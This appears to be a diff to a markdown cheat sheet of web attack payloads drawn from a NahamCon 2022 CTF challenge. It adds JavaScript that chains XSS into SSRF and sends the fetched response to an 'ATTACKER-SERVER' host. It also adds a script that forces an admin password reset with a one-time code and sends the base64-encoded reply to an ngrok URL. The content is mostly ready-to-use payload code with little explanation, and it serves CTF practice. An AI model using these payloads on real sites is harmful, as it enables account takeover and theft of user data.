@@ -38,7 +38,7 @@ print("[@] Response Body ", req.text)
 
 # SSRF
 Leveraging XSS to SSRF
-```
+```js
 var request1 = new XMLHttpRequest();
 request1.open('GET', "<SSRF-URL>", false);
 request1.send()
@@ -46,4 +46,30 @@ var response1 = request1.responseText;
 var request2 = new XMLHttpRequest();
 request2.open('GET', 'http://ATTACKER-SERVER/?meow=' + response1, true);
 request2.send()
+```
+> **Another script**: https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/nahamcon_22/web/two_for_one/2fa_exfil.js
+
+# Reset password
+Taken from: https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/nahamcon_22/web/two_for_one/reset_pw.js
+```js
+// Reset admin password
+var http = new XMLHttpRequest();
+var url = 'http://challenge.nahamcon.com:30666/reset_password';
+// To json because it was required by the server...remove when not needed
+var data = JSON.stringify({
+'password':'admin',
+'password2':'admin',
+'otp':'661035',
+});
+http.open('POST', url, true);
+
+// Not actually needed, just for debugging
+http.onload = function () {
+var flag = btoa(http.responseText);
+var exfil = new XMLHttpRequest();
+exfil.open("GET","http://b6a5-81-103-153-174.ngrok.io?flag=" + flag);
+exfil.send();
+};
+http.setRequestHeader('Content-type', 'application/json');
+http.send(data);
 ```
